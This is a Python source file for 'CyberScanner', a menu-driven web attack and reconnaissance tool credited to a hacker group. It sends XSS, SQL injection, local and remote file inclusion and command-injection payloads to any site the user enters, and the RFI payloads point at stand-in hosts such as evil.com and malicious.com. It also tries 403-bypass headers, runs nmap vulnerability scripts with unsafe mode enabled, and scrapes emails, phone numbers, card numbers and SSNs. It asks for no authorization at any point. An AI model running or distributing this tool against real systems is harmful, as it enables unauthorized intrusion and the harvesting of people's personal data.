#!/usr/bin/env python3
import os
import sys
import time
import json
import re
import socket
import nmap
import requests
import threading
from urllib.parse import urljoin, urlparse, quote, parse_qs
from fake_useragent import UserAgent
from colorama import Fore, Style, init
import pyfiglet

init(autoreset=True)

class Colors:
    RED = Fore.RED
    GREEN = Fore.GREEN
    YELLOW = Fore.YELLOW
    BLUE = Fore.BLUE
    MAGENTA = Fore.MAGENTA
    CYAN = Fore.CYAN
    WHITE = Fore.WHITE
    RESET = Style.RESET_ALL

class CyberScanner:
    def __init__(self):
        self.target = ""
        self.filename = "cyberscan_report.txt"
        self.results = {
            "ip_info": {},
            "server_info": {},
            "hidden_pages": [],
            "admin_pages": [],
            "bypass_success": [],
            "credentials": [],
            "sensitive_data": {
                "emails": [],
                "phone_numbers": [],
                "credit_cards": [],
                "social_security": []
            },
            "security_headers": {},
            "vulnerabilities": {
                "sqli": [],
                "xss": [],
                "lfi": [],
                "rfi": [],
                "idor": [],
                "cmd_injection": [],
                "open_redirect": [],
                "misconfigurations": [],
                "cve": []
            },
            "nmap_scan": {},
            "errors": []
        }
        self.headers = {'User-Agent': UserAgent().random}
        self.lock = threading.Lock()

    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    def show_banner(self):
        self.clear_screen()
        banner = pyfiglet.figlet_format("CyberScanner", font="slant")
        print(f"{Colors.RED}{banner}")
        print(f"{Colors.CYAN}Developed by Anonymous Jordan Team")
        print(f"{Colors.MAGENTA}Telegram: https://t.me/AnonymousJordan\n")
        print(f"{Colors.GREEN}{'='*50}\n")

    def show_menu(self):
        self.show_banner()
        print(f"{Colors.YELLOW}[01] {Colors.WHITE}Full Cyber Scan")
        print(f"{Colors.YELLOW}[02] {Colors.WHITE}Developer Information")
        print(f"{Colors.RED}[99] {Colors.WHITE}Exit Tool")
        print(f"\n{Colors.CYAN}Select option: ", end="")
        sys.stdout.flush()

    def show_developer_info(self):
        self.clear_screen()
        print(f"{Colors.GREEN}Tool Made By Anonymous Jordan")
        print(f"{Colors.CYAN}Telegram: {Colors.WHITE}https://t.me/AnonymousJordan")
        input(f"\n{Colors.YELLOW}Press Enter to return to menu...")

    def normalize_url(self, url):
        return url if url.startswith(('http', 'https')) else f"http://{url}"

    def get_custom_filename(self):
        try:
            filename = input(f"{Colors.CYAN}Enter filename (default: cyberscan_report.txt): ").strip()
            if filename:
                self.filename = filename if filename.endswith('.txt') else f"{filename}.txt"
        except Exception as e:
            self.log_error(f"Filename Error: {str(e)}")
            print(f"{Colors.RED}[!] Using default filename")

    def get_ip_info(self):
        domain = urlparse(self.target).netloc
        try:
            ip = socket.gethostbyname(domain)
            reverse_dns = "N/A"
            try:
                reverse_dns = socket.gethostbyaddr(ip)[0]
            except socket.herror:
                pass
            self.results['ip_info'] = {
                'domain': domain,
                'ip_address': ip,
                'reverse_dns': reverse_dns
            }
        except Exception as e:
            self.log_error(f"IP Lookup Error: {str(e)}")

    def check_server_info(self):
        try:
            resp = requests.get(self.target, headers=self.headers, timeout=10)
            self.results['server_info'] = {
                'Server': resp.headers.get('Server', 'Not disclosed'),
                'X-Powered-By': resp.headers.get('X-Powered-By', 'Not disclosed'),
                'X-AspNet-Version': resp.headers.get('X-AspNet-Version', 'Not disclosed')
            }
        except Exception as e:
            self.log_error(f"Server Check Error: {str(e)}")

    def check_hidden_pages(self):
        common_paths = [
            'admin', 'login', 'wp-admin', 'administrator', 'admin.php',
            'backup', 'config', 'robots.txt', 'phpmyadmin', 'test',
            'dev', 'old', '.git', '.svn', 'web.config', 'sitemap.xml',
            'README.md', 'LICENSE', 'CHANGELOG', 'db.php', 'database.php'
        ]

        def check_path(path):
            url = urljoin(self.target, path)
            try:
                resp = requests.get(url, headers=self.headers, timeout=5)
                if resp.status_code in (200, 403):
                    with self.lock:
                        entry = {
                            'url': url,
                            'status_code': resp.status_code,
                            'content_length': len(resp.content)
                        }
                        self.results['hidden_pages'].append(entry)
                        if "admin" in path.lower():
                            self.results['admin_pages'].append(url)
                # Attempt 403 bypass
                if resp.status_code == 403:
                    self.bypass_403(url)
            except Exception as e:
                self.log_error(f"Hidden Page Check Error ({url}): {str(e)}")

        threads = [threading.Thread(target=check_path, args=(path,)) for path in common_paths]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

    def bypass_403(self, url):
        bypass_headers = [
            {'X-Original-URL': '/'},
            {'X-Custom-IP-Authorization': '127.0.0.1'},
            {'X-Forwarded-For': '127.0.0.1'},
            {'Referer': self.target},
            {'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'}
        ]
        
        for header in bypass_headers:
            try:
                resp = requests.get(url, headers={**self.headers, **header}, timeout=5)
                if resp.status_code == 200:
                    with self.lock:
                        self.results['bypass_success'].append({
                            'url': url,
                            'bypass_header': str(header)
                        })
                    return True
            except Exception as e:
                self.log_error(f"403 Bypass Error ({url}): {str(e)}")
        return False

    def check_credentials_exposure(self):
        sensitive_keywords = ['password', 'passwd', 'api_key', 'secret', 'db_password']
        try:
            resp = requests.get(self.target, headers=self.headers, timeout=10)
            found = [kw for kw in sensitive_keywords if re.search(rf'\b{kw}\b', resp.text, re.IGNORECASE)]
            if found:
                self.results['credentials'].append({
                    'url': self.target,
                    'keywords': found,
                    'severity': 'Critical'
                })
        except Exception as e:
            self.log_error(f"Credentials Check Error: {str(e)}")

    def check_sensitive_data(self):
        patterns = {
            'emails': r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
            'phone_numbers': r'^(\+\d{1,3})?[\s.-]?\(?\d{1,4}\)?[\s.-]?\d{1,4}[\s.-]?\d{1,4}[\s.-]?\d{1,9}$',
            'credit_cards': r'\b(?:\d[ -]*?){13,16}\b',
            'social_security': r'\b\d{3}-\d{2}-\d{4}\b'
        }
        
        try:
            resp = requests.get(self.target, headers=self.headers, timeout=10)
            content = resp.text
            for data_type, regex in patterns.items():
                matches = list(set(re.findall(regex, content)))
                if matches and data_type == 'phone_numbers':
                    matches = [num for num in matches if len(num.replace('-', '').replace('.', '').replace(' ', '')) >= 8]
                self.results['sensitive_data'][data_type] = matches
        except Exception as e:
            self.log_error(f"Sensitive Data Check Error: {str(e)}")

    def check_security_headers(self):
        required_headers = [
            'Content-Security-Policy',
            'X-Content-Type-Options',
            'X-Frame-Options',
            'X-XSS-Protection',
            'Strict-Transport-Security'
        ]
        
        try:
            resp = requests.get(self.target, headers=self.headers, timeout=10)
            missing = [h for h in required_headers if h not in resp.headers]
            self.results['security_headers'] = {
                'missing_headers': missing,
                'severity': 'High' if missing else 'None'
            }
        except Exception as e:
            self.log_error(f"Security Headers Check Error: {str(e)}")

    def run_nmap_scan(self):
        try:
            nm = nmap.PortScanner()
            nm.scan(hosts=urlparse(self.target).netloc, 
                    arguments='-sV -O -T4 --script=vuln --script-args=unsafe=1')
            self.results['nmap_scan'] = nm.scaninfo()
        except Exception as e:
            self.log_error(f"Nmap Error: {str(e)}")

    def check_cve_vulnerabilities(self):
        try:
            nm = nmap.PortScanner()
            nm.scan(hosts=urlparse(self.target).netloc, 
                    arguments='--script vulners --script-args mincvss=7.0')
            host = urlparse(self.target).netloc
            if 'script' in nm[host]:
                for script, output in nm[host]['script'].items():
                    cve_matches = re.findall(r'CVE-\d{4}-\d{4,7}', output)
                    if cve_matches:
                        self.results['vulnerabilities']['cve'].append({
                            'script': script,
                            'CVEs': cve_matches,
                            'severity': 'Critical'
                        })
        except Exception as e:
            self.log_error(f"CVE Check Error: {str(e)}")

    def check_xss(self):
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "';alert('XSS')//"
        ]
        parsed = urlparse(self.target)
        params = parse_qs(parsed.query)
        
        for param in params:
            for payload in xss_payloads:
                url = f"{self.target.split('?')[0]}?{param}={quote(payload)}"
                try:
                    resp = requests.get(url, headers=self.headers, timeout=10)
                    if any(x in resp.text for x in ['<script>', 'alert(']):
                        self.results['vulnerabilities']['xss'].append({
                            'url': url,
                            'payload': payload,
                            'severity': 'High'
                        })
                except Exception as e:
                    self.log_error(f"XSS Check Error ({url}): {str(e)}")

    def check_sqli(self):
        sqli_payloads = ["' OR 1=1--", "' UNION SELECT null, version()--"]
        parsed = urlparse(self.target)
        params = parse_qs(parsed.query)
        
        for param in params:
            for payload in sqli_payloads:
                url = f"{self.target.split('?')[0]}?{param}={quote(payload)}"
                try:
                    resp = requests.get(url, headers=self.headers, timeout=10)
                    if "SQL syntax" in resp.text or "error in your SQL" in resp.text:
                        self.results['vulnerabilities']['sqli'].append({
                            'url': url,
                            'payload': payload,
                            'severity': 'Critical'
                        })
                except Exception as e:
                    self.log_error(f"SQLi Check Error ({url}): {str(e)}")

    def check_lfi(self):
        lfi_payloads = ["../../../../etc/passwd", "../../../../windows/win.ini"]
        parsed = urlparse(self.target)
        params = parse_qs(parsed.query)
        
        for param in params:
            for payload in lfi_payloads:
                url = f"{self.target.split('?')[0]}?{param}={quote(payload)}"
                try:
                    resp = requests.get(url, headers=self.headers, timeout=10)
                    if "root:" in resp.text or "[fonts]" in resp.text:
                        self.results['vulnerabilities']['lfi'].append({
                            'url': url,
                            'payload': payload,
                            'severity': 'High'
                        })
                except Exception as e:
                    self.log_error(f"LFI Check Error ({url}): {str(e)}")

    def check_rfi(self):
        rfi_payloads = ["http://evil.com/exploit.txt", "https://malicious.com/shell.php"]
        parsed = urlparse(self.target)
        params = parse_qs(parsed.query)
        
        for param in params:
            for payload in rfi_payloads:
                url = f"{self.target.split('?')[0]}?{param}={quote(payload)}"
                try:
                    resp = requests.get(url, headers=self.headers, timeout=10)
                    if "Hacked" in resp.text or "exploit" in resp.text:
                        self.results['vulnerabilities']['rfi'].append({
                            'url': url,
                            'payload': payload,
                            'severity': 'Critical'
                        })
                except Exception as e:
                    self.log_error(f"RFI Check Error ({url}): {str(e)}")

    def check_idor(self):
        try:
            test_url = self.target.replace("user=1", "user=2") if "user=1" in self.target else None
            if test_url:
                resp = requests.get(test_url, headers=self.headers, timeout=10)
                if resp.status_code == 200 and "user 2" in resp.text.lower():
                    self.results['vulnerabilities']['idor'].append({
                        'url': test_url,
                        'severity': 'High'
                    })
        except Exception as e:
            self.log_error(f"IDOR Check Error: {str(e)}")

    def check_open_redirect(self):
        payloads = ["https://google.com", "//malicious.site"]
        parsed = urlparse(self.target)
        params = parse_qs(parsed.query)
        
        for param in params:
            for payload in payloads:
                url = f"{self.target.split('?')[0]}?{param}={quote(payload)}"
                try:
                    resp = requests.get(url, headers=self.headers, timeout=10, allow_redirects=False)
                    if resp.status_code in (301, 302):
                        location = resp.headers.get('Location', '')
                        if payload in location:
                            self.results['vulnerabilities']['open_redirect'].append({
                                'url': url,
                                'payload': payload,
                                'severity': 'Medium'
                            })
                except Exception as e:
                    self.log_error(f"Open Redirect Check Error ({url}): {str(e)}")

    def check_cmd_injection(self):
        payloads = ["; ls", "| dir", "&& whoami"]
        parsed = urlparse(self.target)
        params = parse_qs(parsed.query)
        
        for param in params:
            for payload in payloads:
                url = f"{self.target.split('?')[0]}?{param}={quote(payload)}"
                try:
                    resp = requests.get(url, headers=self.headers, timeout=10)
                    if "root:" in resp.text or "Windows" in resp.text:
                        self.results['vulnerabilities']['cmd_injection'].append({
                            'url': url,
                            'payload': payload,
                            'severity': 'Critical'
                        })
                except Exception as e:
                    self.log_error(f"Command Injection Check Error ({url}): {str(e)}")

    def check_misconfigurations(self):
        try:
            test_url = urljoin(self.target, ".git/config")
            resp = requests.get(test_url, headers=self.headers, timeout=10)
            if resp.status_code == 200 and "[core]" in resp.text:
                self.results['vulnerabilities']['misconfigurations'].append({
                    'url': test_url,
                    'issue': 'Exposed .git directory',
                    'severity': 'Medium'
                })
        except Exception as e:
            self.log_error(f"Misconfiguration Check Error: {str(e)}")

    def log_error(self, message):
        with self.lock:
            self.results['errors'].append({
                'timestamp': time.strftime("%Y-%m-%d %H:%M:%S"),
                'message': message
            })

    def generate_txt_report(self):
        report = []
        report.append(f"{'='*80}")
        report.append(f"  CyberScanner Report - {time.strftime('%Y-%m-%d %H:%M:%S')}")
        report.append(f"{'='*80}\n")
        report.append(f"Target: {self.target}\n")

        # IP Information
        report.append(f"{Colors.YELLOW}IP INFORMATION")
        report.append("-" * 40)
        if self.results['ip_info']:
            for k, v in self.results['ip_info'].items():
                report.append(f"{k.replace('_', ' ').title()}: {v}")
        else:
            report.append("No IP information available")

        # Server Information
        report.append(f"\n{Colors.YELLOW}SERVER INFORMATION")
        report.append("-" * 40)
        if self.results['server_info']:
            for k, v in self.results['server_info'].items():
                report.append(f"{k.replace('_', ' ').title()}: {v}")
        else:
            report.append("No server information available")

        # Admin Pages
        report.append(f"\n{Colors.YELLOW}ADMIN PAGES")
        report.append("-" * 40)
        if self.results['admin_pages']:
            report.append("\n".join([f"  - {url}" for url in self.results['admin_pages']]))
        else:
            report.append("No admin pages found")

        # 403 Bypass
        report.append(f"\n{Colors.YELLOW}403 BYPASS SUCCESS")
        report.append("-" * 40)
        if self.results['bypass_success']:
            for entry in self.results['bypass_success']:
                report.append(f"URL: {entry['url']}")
                report.append(f"  Bypass Header: {entry['bypass_header']}")
        else:
            report.append("No 403 bypass successes")

        # Sensitive Data
        report.append(f"\n{Colors.YELLOW}SENSITIVE DATA")
        report.append("-" * 40)
        for data_type in self.results['sensitive_data']:
            report.append(f"\n{data_type.upper()}:")
            if self.results['sensitive_data'][data_type]:
                report.append("\n".join([f"  - {item}" for item in self.results['sensitive_data'][data_type]]))
            else:
                report.append("  None found")

        # Security Headers
        report.append(f"\n{Colors.YELLOW}SECURITY HEADERS")
        report.append("-" * 40)
        if self.results['security_headers']:
            report.append(f"Missing Headers: {', '.join(self.results['security_headers']['missing_headers'])}")
            report.append(f"Severity: {self.results['security_headers']['severity']}")
        else:
            report.append("Security headers check failed")

        # Vulnerabilities
        report.append(f"\n{Colors.YELLOW}VULNERABILITIES")
        report.append("-" * 40)
        for vuln_type in self.results['vulnerabilities']:
            if self.results['vulnerabilities'][vuln_type]:
                report.append(f"\n{vuln_type.upper()} ({len(self.results['vulnerabilities'][vuln_type])} findings):")
                for vuln in self.results['vulnerabilities'][vuln_type]:
                    report.append(f"  URL: {vuln.get('url', 'N/A')}")
                    report.append(f"  Payload: {vuln.get('payload', 'N/A')}")
                    report.append(f"  Severity: {vuln['severity']}")
                    if 'CVEs' in vuln:
                        report.append(f"  CVEs: {', '.join(vuln['CVEs'])}")

        # Nmap Scan
        report.append(f"\n{Colors.YELLOW}NMAP SCAN RESULTS")
        report.append("-" * 40)
        if self.results['nmap_scan']:
            report.append(json.dumps(self.results['nmap_scan'], indent=2))
        else:
            report.append("Nmap scan failed")

        # Errors
        report.append(f"\n{Colors.YELLOW}ERRORS")
        report.append("-" * 40)
        if self.results['errors']:
            for error in self.results['errors']:
                report.append(f"[{error['timestamp']}] {error['message']}")
        else:
            report.append("No errors encountered")

        return "\n".join(report)

    def save_report(self, content):
        save_path = os.path.expanduser(f"~/Documents/{self.filename}")
        try:
            os.makedirs(os.path.dirname(save_path), exist_ok=True)
            with open(save_path, 'w', encoding='utf-8') as f:
                f.write(content)
            return save_path
        except Exception as e:
            self.log_error(f"Report Save Error: {str(e)}")
            return None

    def full_scan(self):
        self.show_banner()
        target = input(f"{Colors.CYAN}Enter target URL: {Colors.WHITE}").strip()
        self.target = self.normalize_url(target)
        self.get_custom_filename()
        
        if not self.target:
            print(f"{Colors.RED}[!] Invalid target URL")
            return

        print(f"\n{Colors.YELLOW}[+] Starting Full Cyber Scan on {self.target}")
        print(f"{Colors.BLUE}{'='*50}\n")
        
        scan_functions = [
            ('IP Information', self.get_ip_info),
            ('Server Information', self.check_server_info),
            ('Hidden Pages Scan', self.check_hidden_pages),
            ('Credentials Exposure', self.check_credentials_exposure),
            ('Sensitive Data Detection', self.check_sensitive_data),
            ('Security Headers Check', self.check_security_headers),
            ('SQLi Check', self.check_sqli),
            ('XSS Check', self.check_xss),
            ('LFI Check', self.check_lfi),
            ('RFI Check', self.check_rfi),
            ('IDOR Check', self.check_idor),
            ('Open Redirect Check', self.check_open_redirect),
            ('Command Injection Check', self.check_cmd_injection),
            ('Misconfiguration Check', self.check_misconfigurations),
            ('CVE Check', self.check_cve_vulnerabilities),
            ('Nmap Scan', self.run_nmap_scan)
        ]

        for desc, func in scan_functions:
            print(f"{Colors.GREEN}[+] {desc}... ", end="")
            sys.stdout.flush()
            try:
                func()
                print(f"{Colors.CYAN}Done")
            except Exception as e:
                print(f"{Colors.RED}Failed")
                self.log_error(f"{desc} Failed: {str(e)}")

        report_content = self.generate_txt_report()
        report_path = self.save_report(report_content)
        
        if report_path:
            print(f"\n{Colors.MAGENTA}[+] Scan Completed - Report saved to: {report_path}")
        else:
            print(f"\n{Colors.RED}[!] Report generation failed")

    def run(self):
        while True:
            self.show_menu()
            choice = input().strip()
            if choice == '01':
                self.full_scan()
                input("\nPress Enter to return to menu...")
            elif choice == '02':
                self.show_developer_info()
            elif choice == '99':
                print(f"\n{Colors.RED}Exiting CyberScanner...")
                sys.exit(0)
            else:
                print(f"{Colors.RED}[!] Invalid option! Please choose 01, 02, or 99")
                time.sleep(2)

if __name__ == '__main__':
    try:
        scanner = CyberScanner()
        scanner.run()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Emergency Exit!")
        sys.exit(1)
    except Exception as e:
        print(f"\n{Colors.RED}[!] Critical Error: {str(e)}")
        sys.exit(1)
